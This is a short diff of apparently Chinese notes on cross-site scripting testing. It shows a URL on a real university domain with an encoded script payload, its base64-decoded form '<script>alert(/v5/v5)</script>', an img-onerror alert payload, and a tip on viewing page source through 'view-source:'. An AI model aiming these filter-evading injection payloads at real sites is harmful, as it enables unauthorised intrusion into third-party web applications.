@@ -10,8 +10,12 @@ http://tdxyk.fmmu.edu.cn/list.aspx?ID=%2B/v8%20%2BADwAcwBjAHIAaQBwAHQAPgBhAGwAZQ
 ADwAcwBjAHIAaQBwAHQAPgBhAGwAZQByAHQAKAAvAHYANQB2ADUALwApADwALwBzAGMAcgBpAHAAdAA+
 A-
 
-3.base64-decode:ADwAcwBjAHIAaQBwAHQAPgBhAGwAZQByAHQAKAAvAHYANQB2ADUALwApADwALwBzAGMAcgBpAHAAdAA+
+3.Base64-Decode
+ADwAcwBjAHIAaQBwAHQAPgBhAGwAZQByAHQAKAAvAHYANQB2ADUALwApADwALwBzAGMAcgBpAHAAdAA+
+解码后
 <script>alert(/v5/v5)</script>
 
 %27/><img%20src=@%20onerror=alert(9974)%20/>
 '/><img src=@ onerror=alert(9974) />
+
+不能右键看源码可以直接在url的前面输入view-source:就行了
